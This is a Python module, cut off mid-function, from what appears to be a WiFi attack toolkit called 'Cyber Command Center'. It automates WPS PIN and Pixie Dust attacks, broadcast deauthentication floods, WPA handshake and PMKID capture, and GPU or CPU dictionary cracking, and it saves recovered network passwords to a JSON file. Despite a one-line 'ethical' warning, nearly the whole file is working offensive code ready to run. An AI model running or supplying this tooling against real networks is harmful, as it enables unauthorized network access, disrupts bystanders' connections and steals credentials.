"""
Cyber Command Center - Advanced WiFi Hacking Module
Ethical WiFi penetration testing tools
WARNING: Only use on networks you own or have permission to test
"""
import subprocess
import threading
import time
import os
import re
import json
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from pathlib import Path
from dataclasses import dataclass, field
from enum import Enum
import platform

# Shared input-validation helpers (prevents command injection via subprocess)
from core.wifi_audit import validate_bssid, validate_mac, validate_interface, validate_channel


class AttackType(Enum):
    WPS_PIN = "wps_pin"
    WPS_PIXIE = "wps_pixie"
    HANDSHAKE_CAPTURE = "handshake_capture"
    PMKID_CAPTURE = "pmkid_capture"
    DICTIONARY_ATTACK = "dictionary_attack"
    EVIL_TWIN = "evil_twin"
    DEAUTH = "deauth"


@dataclass
class WPSNetwork:
    """WiFi network with WPS information"""
    bssid: str
    essid: str
    channel: int
    signal: int
    wps_enabled: bool
    wps_locked: bool = False
    wps_version: str = ""
    manufacturer: str = ""
    model: str = ""
    serial: str = ""
    
    def to_dict(self):
        return {
            'bssid': self.bssid,
            'essid': self.essid,
            'channel': self.channel,
            'signal': self.signal,
            'wps_enabled': self.wps_enabled,
            'wps_locked': self.wps_locked,
            'wps_version': self.wps_version,
            'manufacturer': self.manufacturer,
            'model': self.model,
            'serial': self.serial
        }


@dataclass
class AttackResult:
    """Result of an attack attempt"""
    attack_type: AttackType
    target_bssid: str
    target_essid: str
    success: bool
    password: str = None
    pin: str = None
    error: str = None
    duration_seconds: float = 0
    timestamp: datetime = None
    details: Dict = field(default_factory=dict)
    
    def to_dict(self):
        return {
            'attack_type': self.attack_type.value,
            'target_bssid': self.target_bssid,
            'target_essid': self.target_essid,
            'success': self.success,
            'password': self.password,
            'pin': self.pin,
            'error': self.error,
            'duration_seconds': self.duration_seconds,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
            'details': self.details
        }


class WiFiHacker:
    """
    Advanced WiFi Penetration Testing Tools
    
    Supports:
    - WPS PIN attack (Reaver)
    - WPS Pixie Dust attack
    - Handshake capture
    - PMKID capture (hashcat)
    - Dictionary attacks (aircrack-ng, hashcat)
    - Evil Twin attacks
    - Deauthentication attacks
    """
    
    def __init__(self):
        self.base_dir = Path(__file__).parent.parent
        self.captures_dir = self.base_dir / "captures"
        self.handshakes_dir = self.captures_dir / "handshakes"
        self.wordlists_dir = self.base_dir / "wordlists"
        self.results_dir = self.captures_dir / "results"
        
        # Create directories
        for d in [self.captures_dir, self.handshakes_dir, self.wordlists_dir, self.results_dir]:
            d.mkdir(parents=True, exist_ok=True)
        
        self.current_attack = None
        self.attack_process = None
        self.attack_results: List[AttackResult] = []
        self.interface = None          # Base wireless interface (e.g. wlan0)
        self.monitor_interface = None  # Monitor mode interface (e.g. wlan0mon)
        self._attack_thread = None
        self._stop_flag = False
        self._socketio = None          # SocketIO instance for real-time events

        # Check available tools
        self.tools_available = self._check_tools()
    
    def _check_tools(self) -> Dict[str, bool]:
        """Check which hacking tools are available"""
        tools = {
            'aircrack-ng': False,
            'airodump-ng': False,
            'aireplay-ng': False,
            'airmon-ng': False,
            'reaver': False,
            'bully': False,
            'hashcat': False,
            'hcxdumptool': False,
            'hcxpcapngtool': False,
            'wash': False,
            'mdk4': False,
            'hostapd': False
        }
        
        is_windows = platform.system() == 'Windows'
        
        for tool in tools:
            try:
                if is_windows:
                    result = subprocess.run(
                        ['where', tool],
                        capture_output=True,
                        timeout=5
                    )
                else:
                    result = subprocess.run(
                        ['which', tool],
                        capture_output=True,
                        timeout=5
                    )
                tools[tool] = result.returncode == 0
            except:
                tools[tool] = False
        
        return tools
    
    # ------------------------------------------------------------------
    # API compatibility helpers (called from app.py routes)
    # ------------------------------------------------------------------

    def is_available(self) -> bool:
        """Return True if at least one tool is available."""
        return any(self.tools_available.values())

    def check_requirements(self) -> Dict:
        """Alias for get_requirements() used by app.py status route."""
        return self.get_requirements()

    @property
    def monitor_mode_enabled(self) -> bool:
        """True when a monitor interface is active."""
        return self.monitor_interface is not None

    def get_wireless_interfaces(self) -> List[str]:
        """Return wireless interface names using iw dev or iwconfig."""
        interfaces = []
        try:
            result = subprocess.run(
                ['iw', 'dev'], capture_output=True, text=True, timeout=10
            )
            for line in result.stdout.split('\n'):
                if 'Interface' in line:
                    iface = line.split()[-1].strip()
                    if iface:
                        interfaces.append(iface)
        except FileNotFoundError:
            pass

        if not interfaces:
            try:
                result = subprocess.run(
                    ['iwconfig'], capture_output=True, text=True,
                    stderr=subprocess.DEVNULL, timeout=10
                )
                for line in result.stdout.split('\n'):
                    if 'IEEE 802.11' in line:
                        iface = line.split()[0].strip()
                        if iface:
                            interfaces.append(iface)
            except Exception:
                pass

        return interfaces

    def set_interface(self, interface: str):
        """Set the base wireless interface."""
        self.interface = interface

    def set_socketio(self, socketio_instance):
        """Attach a Flask-SocketIO instance for real-time event emission."""
        self._socketio = socketio_instance

    def _emit(self, event: str, data: dict):
        """Emit a SocketIO event if an instance is configured."""
        if self._socketio:
            try:
                self._socketio.emit(event, data)
            except Exception:
                pass

    # ------------------------------------------------------------------

    def get_requirements(self) -> Dict:
        """Get tool requirements and availability status"""
        attacks = {
            'wps_pin': {
                'name': 'WPS PIN Attack',
                'description': 'Ataque de fuerza bruta al PIN WPS del router',
                'requirements': ['reaver', 'wash', 'airmon-ng'],
                'time_estimate': '4-10 horas',
                'success_rate': 'Medio (depende si WPS está activo)'
            },
            'wps_pixie': {
                'name': 'Pixie Dust Attack',
                'description': 'Ataque rápido a WPS usando vulnerabilidad Pixie Dust',
                'requirements': ['reaver', 'wash'],
                'time_estimate': '1-5 minutos',
                'success_rate': 'Alto en routers vulnerables'
            },
            'handshake': {
                'name': 'Captura de Handshake',
                'description': 'Captura el handshake WPA para crackear offline',
                'requirements': ['airodump-ng', 'aireplay-ng', 'airmon-ng'],
                'time_estimate': '1-10 minutos',
                'success_rate': 'Alto'
            },
            'pmkid': {
                'name': 'PMKID Attack',
                'description': 'Captura PMKID sin necesidad de handshake',
                'requirements': ['hcxdumptool', 'hcxpcapngtool', 'hashcat'],
                'time_estimate': '1-5 minutos',
                'success_rate': 'Medio'
            },
            'dictionary': {
                'name': 'Ataque de Diccionario',
                'description': 'Prueba contraseñas de una lista',
                'requirements': ['aircrack-ng'],
                'time_estimate': 'Depende del diccionario',
                'success_rate': 'Depende de la contraseña'
            },
            'evil_twin': {
                'name': 'Evil Twin',
                'description': 'Crea un punto de acceso falso',
                'requirements': ['hostapd', 'dnsmasq', 'airmon-ng'],
                'time_estimate': 'Continuo',
                'success_rate': 'Alto con ingeniería social'
            }
        }
        
        for attack_id, attack in attacks.items():
            available = all(self.tools_available.get(req, False) for req in attack['requirements'])
            attack['available'] = available
            attack['missing_tools'] = [
                req for req in attack['requirements'] 
                if not self.tools_available.get(req, False)
            ]
        
        return {
            'tools': self.tools_available,
            'attacks': attacks,
            'monitor_mode_available': self.tools_available.get('airmon-ng', False),
            'platform': platform.system()
        }
    
    def enable_monitor_mode(self, interface: str = None) -> Dict:
        """Enable monitor mode on wireless interface"""
        if not self.tools_available.get('airmon-ng'):
            return {'success': False, 'error': 'airmon-ng not available'}

        try:
            # Kill interfering processes (wpa_supplicant, dhclient, etc.)
            subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True, timeout=30)

            # Resolve interface: use argument, stored interface, or auto-detect
            if not interface:
                interface = self.interface
            if not interface:
                detected = self.get_wireless_interfaces()
                if detected:
                    interface = detected[0]
                else:
                    return {'success': False, 'error': 'No wireless interface found'}

            # Start monitor mode
            result = subprocess.run(
                ['airmon-ng', 'start', interface],
                capture_output=True,
                text=True,
                timeout=30
            )

            output = result.stdout + result.stderr

            # Parse the actual monitor interface name from airmon-ng output.
            # Common output patterns:
            #   "monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon"
            #   "(monitor mode enabled on wlan0mon)"
            #   "monitor mode enabled"
            mon_iface = None
            patterns = [
                r'monitor mode.*?enabled.*?on\s+\[?[\w]*\]?(\w+)',
                r'monitor mode.*?enabled.*?\[[\w]+\](\w+)',
                r'\(monitor mode enabled on\s+(\w+)\)',
                r'enabled\s+(\w+mon\w*)',
            ]
            for pattern in patterns:
                match = re.search(pattern, output, re.IGNORECASE)
                if match:
                    candidate = match.group(1).strip()
                    if candidate and candidate != interface:
                        mon_iface = candidate
                        break

            # Fallback: check if <interface>mon exists
            if not mon_iface:
                candidate = interface + 'mon'
                check = subprocess.run(
                    ['ip', 'link', 'show', candidate],
                    capture_output=True, timeout=5
                )
                if check.returncode == 0:
                    mon_iface = candidate
                else:
                    # Some drivers keep the same name in monitor mode
                    mon_iface = interface

            self.monitor_interface = mon_iface
            if self.interface is None:
                self.interface = interface

            return {
                'success': True,
                'interface': self.monitor_interface,
                'original_interface': interface
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def disable_monitor_mode(self) -> Dict:
        """Disable monitor mode"""
        if not self.monitor_interface:
            return {'success': True, 'message': 'No monitor interface active'}
        
        try:
            subprocess.run(
                ['airmon-ng', 'stop', self.monitor_interface],
                capture_output=True,
                timeout=30
            )
            
            # Restart network manager
            subprocess.run(['service', 'NetworkManager', 'restart'], capture_output=True, timeout=30)
            
            self.monitor_interface = None
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def scan_wps_networks(self, timeout: int = 30) -> List[Dict]:
        """Scan for networks with WPS enabled using wash"""
        if not self.tools_available.get('wash'):
            return []
        
        if not self.monitor_interface:
            self.enable_monitor_mode()
        
        if not self.monitor_interface:
            return []
        
        try:
            result = subprocess.run(
                ['wash', '-i', self.monitor_interface, '-s'],
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            networks = []
            for line in result.stdout.split('\n'):
                # Parse wash output
                # BSSID              Ch  dBm  WPS  Lck  Vendor    ESSID
                match = re.match(
                    r'([0-9A-Fa-f:]{17})\s+(\d+)\s+(-?\d+)\s+(\d\.\d)\s+(Yes|No)\s+(\S*)\s+(.*)',
                    line.strip()
                )
                if match:
                    networks.append(WPSNetwork(
                        bssid=match.group(1),
                        channel=int(match.group(2)),
                        signal=int(match.group(3)),
                        wps_version=match.group(4),
                        wps_locked=match.group(5) == 'Yes',
                        manufacturer=match.group(6),
                        essid=match.group(7).strip(),
                        wps_enabled=True
                    ).to_dict())
            
            return networks
        except Exception as e:
            print(f"Error scanning WPS networks: {e}")
            return []
    
    def attack_wps_pixie(self, bssid: str, channel: int, essid: str = "") -> Dict:
        """
        Pixie Dust WPS attack (fast)
        Uses reaver with pixiewps
        """
        try:
            bssid = validate_bssid(bssid)
            channel = validate_channel(channel)
        except ValueError as e:
            return {'success': False, 'error': str(e)}

        if not self.tools_available.get('reaver'):
            return {'success': False, 'error': 'reaver not available'}

        if not self.monitor_interface:
            result = self.enable_monitor_mode()
            if not result['success']:
                return result
        
        self.current_attack = AttackType.WPS_PIXIE
        self._stop_flag = False
        start_time = time.time()
        
        try:
            # Run reaver with Pixie Dust
            cmd = [
                'reaver',
                '-i', self.monitor_interface,
                '-b', bssid,
                '-c', str(channel),
                '-K', '1',  # Pixie Dust attack
                '-vv'
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            self.attack_process = process
            output = ""
            pin = None
            password = None
            
            while process.poll() is None and not self._stop_flag:
                line = process.stdout.readline()
                output += line
                
                # Look for PIN
                pin_match = re.search(r'WPS PIN:\s*[\'"]?(\d{8})[\'"]?', line)
                if pin_match:
                    pin = pin_match.group(1)
                
                # Look for password
                psk_match = re.search(r'WPA PSK:\s*[\'"]?(.+?)[\'"]?\s*$', line)
                if psk_match:
                    password = psk_match.group(1)
                
                if password:
                    break
            
            process.terminate()
            duration = time.time() - start_time
            
            result = AttackResult(
                attack_type=AttackType.WPS_PIXIE,
                target_bssid=bssid,
                target_essid=essid,
                success=password is not None,
                password=password,
                pin=pin,
                duration_seconds=duration,
                timestamp=datetime.now(),
                details={'output': output[-2000:]}  # Last 2000 chars
            )
            
            if password:
                result.error = None
            else:
                result.error = "Pixie Dust attack failed - router may not be vulnerable"
            
            self.attack_results.append(result)
            self._save_result(result)
            
            return result.to_dict()
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            self.current_attack = None
            self.attack_process = None
    
    def attack_wps_bruteforce(self, bssid: str, channel: int, essid: str = "",
                              delay: float = 1.0, timeout: int = 36000) -> Dict:
        """
        WPS PIN brute force attack
        This is slow but works on most WPS-enabled routers
        """
        try:
            bssid = validate_bssid(bssid)
            channel = validate_channel(channel)
        except ValueError as e:
            return {'success': False, 'error': str(e)}

        if not self.tools_available.get('reaver'):
            return {'success': False, 'error': 'reaver not available'}
        
        if not self.monitor_interface:
            result = self.enable_monitor_mode()
            if not result['success']:
                return result
        
        self.current_attack = AttackType.WPS_PIN
        self._stop_flag = False
        start_time = time.time()
        
        try:
            cmd = [
                'reaver',
                '-i', self.monitor_interface,
                '-b', bssid,
                '-c', str(channel),
                '-d', str(int(delay)),
                '-vv',
                '--no-nacks'
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            self.attack_process = process
            output_lines = []
            pin = None
            password = None
            progress = 0
            
            while process.poll() is None and not self._stop_flag:
                if time.time() - start_time > timeout:
                    process.terminate()
                    break
                
                line = process.stdout.readline()
                output_lines.append(line)
                
                # Parse progress
                progress_match = re.search(r'(\d+\.\d+)% complete', line)
                if progress_match:
                    progress = float(progress_match.group(1))
                
                # Look for PIN
                pin_match = re.search(r'WPS PIN:\s*[\'"]?(\d{8})[\'"]?', line)
                if pin_match:
                    pin = pin_match.group(1)
                
                # Look for password
                psk_match = re.search(r'WPA PSK:\s*[\'"]?(.+?)[\'"]?\s*$', line)
                if psk_match:
                    password = psk_match.group(1)
                    break
            
            process.terminate()
            duration = time.time() - start_time
            
            result = AttackResult(
                attack_type=AttackType.WPS_PIN,
                target_bssid=bssid,
                target_essid=essid,
                success=password is not None,
                password=password,
                pin=pin,
                duration_seconds=duration,
                timestamp=datetime.now(),
                details={
                    'progress': progress,
                    'output': '\n'.join(output_lines[-50:])
                }
            )
            
            self.attack_results.append(result)
            self._save_result(result)
            
            return result.to_dict()
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            self.current_attack = None
            self.attack_process = None
    
    def capture_handshake(self, bssid: str, channel: int, essid: str = "",
                          client_mac: str = None, timeout: int = 120,
                          deauth: bool = True) -> Dict:
        """
        Capture WPA/WPA2 handshake using airodump-ng.
        Sends periodic deauth frames (every 15 s) to force clients to
        re-authenticate, which generates the 4-way handshake.
        Emits SocketIO events so the frontend can follow progress live.
        """
        try:
            bssid = validate_bssid(bssid)
            channel = validate_channel(channel)
            if client_mac:
                client_mac = validate_mac(client_mac, allow_broadcast=True)
        except ValueError as e:
            return {'success': False, 'error': str(e)}

        if not self.tools_available.get('airodump-ng'):
            return {'success': False, 'error': 'airodump-ng not available'}

        if not self.monitor_interface:
            result = self.enable_monitor_mode()
            if not result.get('success'):
                return result

        self.current_attack = AttackType.HANDSHAKE_CAPTURE
        self._stop_flag = False
        start_time = time.time()

        # Output file prefix
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        capture_prefix = self.handshakes_dir / f"handshake_{bssid.replace(':', '')}_{timestamp}"

        self._emit('wifi_capture_status', {
            'status': 'started',
            'bssid': bssid,
            'essid': essid,
            'channel': channel
        })

        try:
            # Start airodump-ng locked to target channel and BSSID
            airodump_cmd = [
                'airodump-ng',
                '-c', str(channel),
                '--bssid', bssid,
                '-w', str(capture_prefix),
                '--output-format', 'cap',
                self.monitor_interface
            ]

            airodump_process = subprocess.Popen(
                airodump_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            self.attack_process = airodump_process
            handshake_captured = False
            deauth_count = 0
            last_deauth_time = 0.0
            deauth_interval = 15  # seconds between deauth bursts

            while time.time() - start_time < timeout and not self._stop_flag:
                cap_file = Path(str(capture_prefix) + "-01.cap")
                elapsed = time.time() - start_time

                # Poll the capture file every 3 s
                time.sleep(3)

                if cap_file.exists() and cap_file.stat().st_size > 0:
                    # Verify handshake with aircrack-ng
                    check_result = subprocess.run(
                        ['aircrack-ng', str(cap_file)],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    if '1 handshake' in check_result.stdout.lower():
                        handshake_captured = True
                        self._emit('wifi_capture_status', {
                            'status': 'captured',
                            'bssid': bssid,
                            'file': str(cap_file),
                            'elapsed': round(elapsed, 1)
                        })
                        break

                # Emit periodic progress
                self._emit('wifi_capture_status', {
                    'status': 'capturing',
                    'bssid': bssid,
                    'elapsed': round(elapsed, 1),
                    'deauth_count': deauth_count
                })

                # Send deauth burst every deauth_interval seconds (no upper limit)
                if (deauth and self.tools_available.get('aireplay-ng') and
                        time.time() - last_deauth_time >= deauth_interval):
                    target = client_mac or 'FF:FF:FF:FF:FF:FF'
                    subprocess.run(
                        ['aireplay-ng', '-0', '3', '-a', bssid,
                         '-c', target, self.monitor_interface],
                        capture_output=True,
                        timeout=10
                    )
                    deauth_count += 1
                    last_deauth_time = time.time()
                    self._emit('wifi_capture_status', {
                        'status': 'deauth_sent',
                        'bssid': bssid,
                        'deauth_count': deauth_count
                    })

            airodump_process.terminate()
            try:
                airodump_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                airodump_process.kill()

            duration = time.time() - start_time
            cap_file = Path(str(capture_prefix) + "-01.cap")

            result = AttackResult(
                attack_type=AttackType.HANDSHAKE_CAPTURE,
                target_bssid=bssid,
                target_essid=essid,
                success=handshake_captured,
                duration_seconds=duration,
                timestamp=datetime.now(),
                details={
                    'capture_file': str(cap_file) if cap_file.exists() else None,
                    'deauth_sent': deauth_count
                }
            )

            if not handshake_captured:
                result.error = "No handshake captured within timeout"
                self._emit('wifi_capture_status', {
                    'status': 'timeout',
                    'bssid': bssid,
                    'elapsed': round(duration, 1)
                })

            self.attack_results.append(result)
            return result.to_dict()

        except Exception as e:
            self._emit('wifi_capture_status', {'status': 'error', 'error': str(e)})
            return {'success': False, 'error': str(e)}
        finally:
            self.current_attack = None
            self.attack_process = None
    
    def crack_handshake(self, capture_file: str, wordlist: str = None,
                        bssid: str = None, use_gpu: bool = False) -> Dict:
        """
        Crack a captured WPA/WPA2 handshake using a dictionary attack.

        When use_gpu=True and hashcat is available the capture is first
        converted to .hc22000 format and hashcat is used (GPU-accelerated).
        Progress is emitted via SocketIO every ~10 s so the frontend can
        show live feedback.

        Falls back to aircrack-ng (CPU) when hashcat is unavailable or
        use_gpu=False.
        """
        if not Path(capture_file).exists():
            return {'success': False, 'error': 'Capture file not found'}

        if not wordlist:
            return {'success': False, 'error': 'Wordlist not specified'}

        if not Path(wordlist).exists():
            wordlist_path = self.wordlists_dir / wordlist
            if not wordlist_path.exists():
                return {'success': False, 'error': 'Wordlist not found'}
            wordlist = str(wordlist_path)

        if bssid:
            try:
                bssid = validate_bssid(bssid)
            except ValueError as e:
                return {'success': False, 'error': str(e)}

        # Route to hashcat when GPU is requested and tool is present
        if use_gpu and self.tools_available.get('hashcat') and self.tools_available.get('hcxpcapngtool'):
            return self._crack_with_hashcat(capture_file, wordlist, bssid)

        # ── aircrack-ng (CPU) path ────────────────────────────────────────
        if not self.tools_available.get('aircrack-ng'):
            return {'success': False, 'error': 'aircrack-ng not available'}

        self.current_attack = AttackType.DICTIONARY_ATTACK
        self._stop_flag = False
        start_time = time.time()

        try:
            cmd = ['aircrack-ng', '-w', wordlist, capture_file]
            if bssid:
                cmd.extend(['-b', bssid])

            process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            self.attack_process = process
            password = None
            keys_tested = 0

            for line in process.stdout:
                if self._stop_flag:
                    process.terminate()
                    break

                key_match = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', line)
                if key_match:
                    password = key_match.group(1)
                    break

                tested_match = re.search(r'(\d+) keys tested', line)
                if tested_match:
                    keys_tested = int(tested_match.group(1))
                    self._emit('wifi_crack_progress', {
                        'tool': 'aircrack-ng',
                        'keys_tested': keys_tested,
                        'elapsed': round(time.time() - start_time, 1)
                    })

            process.wait()
            duration = time.time() - start_time

            result = AttackResult(
                attack_type=AttackType.DICTIONARY_ATTACK,
                target_bssid=bssid or "unknown",
                target_essid="",
                success=password is not None,
                password=password,
                duration_seconds=duration,
                timestamp=datetime.now(),
                details={'wordlist': wordlist, 'keys_tested': keys_tested, 'tool': 'aircrack-ng'}
            )
            if not password:
                result.error = f"Password not found after {keys_tested} attempts"

            self.attack_results.append(result)
            self._save_result(result)
            return result.to_dict()

        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            self.current_attack = None
            self.attack_process = None

    def _crack_with_hashcat(self, capture_file: str, wordlist: str,
                            bssid: str = None) -> Dict:
        """
        Internal GPU-accelerated cracking via hashcat (mode 22000 = WPA-PBKDF2-PMK).
        Converts .cap → .hc22000 first, then streams hashcat output for real-time
        progress events, and reads results with --show at the end.
        """
        self.current_attack = AttackType.DICTIONARY_ATTACK
        self._stop_flag = False
        start_time = time.time()

        cap_path = Path(capture_file)
        hash_file = cap_path.with_suffix('.hc22000')

        try:
            # Step 1: convert capture to hashcat format
            self._emit('wifi_crack_progress', {'tool': 'hashcat', 'status': 'converting'})
            conv = subprocess.run(
                ['hcxpcapngtool', '-o', str(hash_file), str(cap_path)],
                capture_output=True, text=True, timeout=60
            )
            if not hash_file.exists() or hash_file.stat().st_size == 0:
                return {
                    'success': False,
                    'error': f'Conversion to hashcat format failed: {conv.stderr[:200]}'
                }

            # Step 2: run hashcat with status updates every 10 s
            cmd = [
                'hashcat',
                '-m', '22000',   # WPA-PBKDF2-PMK
                '-a', '0',       # Dictionary attack
                '--status',
                '--status-timer', '10',
                '--potfile-disable',  # don't write to global potfile
                str(hash_file),
                wordlist,
            ]
            if bssid:
                cmd.extend(['--username'])  # some builds need this for 22000

            self._emit('wifi_crack_progress', {'tool': 'hashcat', 'status': 'running'})

            process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            self.attack_process = process
            password = None
            speed_kh = 0

            for line in process.stdout:
                if self._stop_flag:
                    process.terminate()
                    break

                # "Cracked" line in potfile-disable mode
                if 'Cracked' in line or 'All hashes found' in line:
                    pass  # will read with --show

                # Speed: "Speed.#1.........:   123.4 kH/s"
                speed_m = re.search(r'Speed.*?:\s*([\d.]+)\s*(k|M|G)?H/s', line, re.I)
                if speed_m:
                    val = float(speed_m.group(1))
                    unit = (speed_m.group(2) or '').lower()
                    speed_kh = int(val * {'k': 1, 'm': 1000, 'g': 1_000_000}.get(unit, 1))
                    self._emit('wifi_crack_progress', {
                        'tool': 'hashcat',
                        'status': 'running',
                        'speed_kh': speed_kh,
                        'elapsed': round(time.time() - start_time, 1)
                    })

            process.wait()

            # Step 3: retrieve cracked password with --show
            show = subprocess.run(
                ['hashcat', '-m', '22000', str(hash_file), '--show'],
                capture_output=True, text=True, timeout=30
            )
            for line in show.stdout.splitlines():
                # Format: <hash>:<ssid>:<password>  or  <hash>:<password>
                parts = line.strip().split(':')
                if len(parts) >= 2:
                    password = parts[-1]
                    break

            duration = time.time() - start_time
            result = AttackResult(
                attack_type=AttackType.DICTIONARY_ATTACK,
                target_bssid=bssid or "unknown",
                target_essid="",
                success=password is not None,
                password=password,
                duration_seconds=duration,
                timestamp=datetime.now(),
                details={
                    'wordlist': wordlist,
                    'tool': 'hashcat',
                    'speed_kh': speed_kh,
                    'hash_file': str(hash_file)
                }
            )
            if not password:
                result.error = "Password not found in wordlist (hashcat)"

            self.attack_results.append(result)
            self._save_result(result)
            return result.to_dict()

        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            self.current_attack = None
            self.attack_process = None
    
    def capture_pmkid(self, bssid: str, channel: int, essid: str = "",
                      timeout: int = 60) -> Dict:
        """
        Capture PMKID for faster cracking (no handshake needed)
        Requires hcxdumptool and hcxpcapngtool
        """
        try:
            bssid = validate_bssid(bssid)
            channel = validate_channel(channel)
        except ValueError as e:
            return {'success': False, 'error': str(e)}

        if not self.tools_available.get('hcxdumptool'):
            return {'success': False, 'error': 'hcxdumptool not available'}
        
        if not self.monitor_interface:
            result = self.enable_monitor_mode()
            if not result['success']:
                return result
        
        self.current_attack = AttackType.PMKID_CAPTURE
        self._stop_flag = False
        start_time = time.time()
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        capture_file = self.captures_dir / f"pmkid_{timestamp}.pcapng"
        hash_file = self.captures_dir / f"pmkid_{timestamp}.hash"
        
        try:
            # Create filter file for target
            filter_file = self.captures_dir / f"filter_{timestamp}.txt"
            with open(filter_file, 'w') as f:
                f.write(bssid.replace(':', '').lower())
            
            # Run hcxdumptool
            cmd = [
                'hcxdumptool',
                '-i', self.monitor_interface,
                '-o', str(capture_file),
                '--filterlist_ap', str(filter_file),
                '--filtermode=2',
                '--enable_status=1'
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            self.attack_process = process
            pmkid_captured = False
            
            while time.time() - start_time < timeout and not self._stop_flag:
                time.sleep(5)
                
                # Check if PMKID captured
                if capture_file.exists() and capture_file.stat().st_size > 0:
                    # Convert to hashcat format
                    convert_result = subprocess.run(
                        ['hcxpcapngtool', '-o', str(hash_file), str(capture_file)],
                        capture_output=True,
                        timeout=30
                    )
                    
                    if hash_file.exists() and hash_file.stat().st_size > 0:
                        pmkid_captured = True
                        break
            
            process.terminate()
            duration = time.time() - start_time
            
            # Clean up filter file
            filter_file.unlink(missing_ok=True)
            
            result = AttackResult(
                attack_type=AttackType.PMKID_CAPTURE,
                target_bssid=bssid,
                target_essid=essid,
                success=pmkid_captured,
                duration_seconds=duration,
                timestamp=datetime.now(),
                details={
                    'capture_file': str(capture_file) if capture_file.exists() else None,
                    'hash_file': str(hash_file) if pmkid_captured else None
                }
            )
            
            if not pmkid_captured:
                result.error = "PMKID not captured - router may not support it"
            
            self.attack_results.append(result)
            
            return result.to_dict()
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            self.current_attack = None
            self.attack_process = None
    
    def stop_attack(self) -> Dict:
        """Stop current attack"""
        self._stop_flag = True

        if self.attack_process:
            try:
                self.attack_process.terminate()
                self.attack_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.attack_process.kill()
            except Exception as e:
                print(f"Error stopping attack process: {e}")

        self.current_attack = None
        self.attack_process = None

        return {'success': True, 'message': 'Attack stopped'}

    def cleanup_old_captures(self, days: int = 7) -> Dict:
        """
        Delete capture files (.cap, .pcapng, .hc22000, .hash) older than
        `days` days.  Preserves the results/ directory (cracked passwords).
        Returns a summary of what was removed.
        """
        import time as _time
        cutoff = _time.time() - (days * 86400)
        removed = []
        freed_bytes = 0

        globs = ['**/*.cap', '**/*.pcapng', '**/*.hc22000',
                 '**/*.hash', '**/filter_*.txt']
        search_dirs = [self.captures_dir]  # handshakes/ is a sub-dir

        for search_dir in search_dirs:
            for pattern in globs:
                for f in search_dir.glob(pattern):
                    # Never delete files inside results/ (cracked passwords)
                    if 'results' in f.parts:
                        continue
                    try:
                        if f.stat().st_mtime < cutoff:
                            freed_bytes += f.stat().st_size
                            f.unlink()
                            removed.append(str(f))
                    except Exception:
                        pass

        return {
            'success': True,
            'files_removed': len(removed),
            'freed_mb': round(freed_bytes / (1024 * 1024), 2),
            'paths': removed
        }

    def list_captures(self) -> List[Dict]:
        """Return metadata for all capture files on disk."""
        captures = []
        for pattern in ['**/*.cap', '**/*.pcapng', '**/*.hc22000']:
            for f in self.captures_dir.glob(pattern):
                if 'results' in f.parts:
                    continue
                try:
                    stat = f.stat()
                    captures.append({
                        'path': str(f),
                        'name': f.name,
                        'size_mb': round(stat.st_size / (1024 * 1024), 3),
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                        'type': f.suffix.lstrip('.')
                    })
                except Exception:
                    pass
        captures.sort(key=lambda x: x['modified'], reverse=True)
        return captures
    
    def get_status(self) -> Dict:
        """Get current attack status"""
        return {
            'current_attack': self.current_attack.value if self.current_attack else None,
            'monitor_interface': self.monitor_interface,
            'tools_available': self.tools_available,
            'total_attacks': len(self.attack_results),
            'successful_attacks': sum(1 for r in self.attack_results if r.success)
        }
    
    def get_results(self, limit: int = 20) -> List[Dict]:
        """Get attack results"""
        return [r.to_dict() for r in self.attack_results[-limit:]]
    
    def get_captured_passwords(self) -> List[Dict]:
        """Get all captured passwords"""
        return [
            {
                'essid': r.target_essid,
                'bssid': r.target_bssid,
                'password': r.password,
                'pin': r.pin,
                'attack_type': r.attack_type.value,
                'timestamp': r.timestamp.isoformat() if r.timestamp else None
            }
            for r in self.attack_results if r.success and r.password
        ]
    
    def _save_result(self, result: AttackResult):
        """Save successful result to file"""
        if result.success and result.password:
            results_file = self.results_dir / "cracked_passwords.json"
            
            try:
                existing = []
                if results_file.exists():
                    with open(results_file, 'r') as f:
                        existing = json.load(f)
                
                existing.append({
                    'essid': result.target_essid,
                    'bssid': result.target_bssid,
                    'password': result.password,
                    'pin': result.pin,
                    'attack_type': result.attack_type.value,
                    'timestamp': result.timestamp.isoformat() if result.timestamp else None
                })
                
                with open(results_file, 'w') as f:
                    json.dump(existing, f, indent=2)
            except Exception as e:
                print(f"Error saving result: {e}")
    
    def get_wordlists(self) -> List[Dict]:
        """Get available wordlists"""
        wordlists = []
        
        for f in self.wordlists_dir.glob('*'):
            if f.is_file():
                # Count lines (approximate for large files)
                try:
                    size = f.stat().st_size
                    # Estimate lines (assume average 10 chars per password)
                    estimated_lines = size // 10
                    
                    wordlists.append({
                        'name': f.name,
